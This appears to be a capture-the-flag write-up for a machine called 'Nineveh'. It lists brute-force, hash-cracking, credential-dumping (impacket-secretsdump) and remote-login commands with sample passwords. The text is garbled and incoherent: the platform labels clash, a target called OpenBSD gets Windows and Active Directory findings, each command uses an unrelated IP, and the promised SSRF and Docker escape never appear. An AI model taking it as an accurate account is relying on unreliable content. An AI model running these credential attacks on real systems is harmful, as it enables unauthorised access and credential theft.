---
TitleSEO: "PwnTillDawn — Nineveh (Medium OpenBSD) | ZureFX"
TitlePost: "PwnTillDawn — Nineveh (Medium OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Nineveh. SSRF and Docker Escape to achieve medium compromise on OpenBSD."
Keywords: "hackthebox, ctf, reversing, linux, pwntilldawn, medium, insane"
URL: "https://zurefx.github.io/writeups/htb-nineveh-694.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-nineveh-694/"
Date: "2025-08-12"
Tags: "HackTheBox, CTF, Reversing, Linux, PwnTillDawn, Medium, Insane"
Section: "writeups"
Lang: "en"
main_img: "htb-nineveh-694"
Permalink: "/writeups/htb-nineveh-694.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Nineveh** is rated **Medium** on PwnTillDawn. It runs **OpenBSD** and the IP address during this analysis was `10.16.58.139`.

### Objectives

Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.55.242.159 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.40.196.109
```

Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service.

### Service Enumeration

The backup files contained sensitive information that should not have been accessible. The service was running without proper input validation, leading to injection vulnerabilities. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
gobuster dir -u http://10.34.189.150/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p636,8443,3268 10.107.115.39 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.81.44.12 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine.

### SMB Enumeration

The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine.

```bash
feroxbuster -h
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.29.68.127 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality. Privilege escalation was possible due to misconfigured sudo permissions.

## Exploitation

### Vulnerability Identification

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions. The service account had excessive permissions assigned in Active Directory.

Key finding: **Docker Escape**.

The database credentials were hardcoded in the application source code. Network traffic analysis revealed unencrypted communications containing user credentials.

### Initial Access

The service account had excessive permissions assigned in Active Directory. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.96.175.140/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.24.169.51/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.32.232.28 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p587,5985,8443 10.88.220.252 -oN scan.txt
```

Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine.

## Privilege Escalation

### Enumeration

The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.75.226.4/FUZZ
gobuster dir -u http://10.31.121.4/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.46.105.111
```

Network traffic analysis revealed unencrypted communications containing user credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services.

## Summary

### Tools Used

- `rpcclient`
- `ligolo-ng`
- `gobuster`
- `msfvenom`
- `sharphound`

### Key Takeaways

- SSRF
- Docker Escape
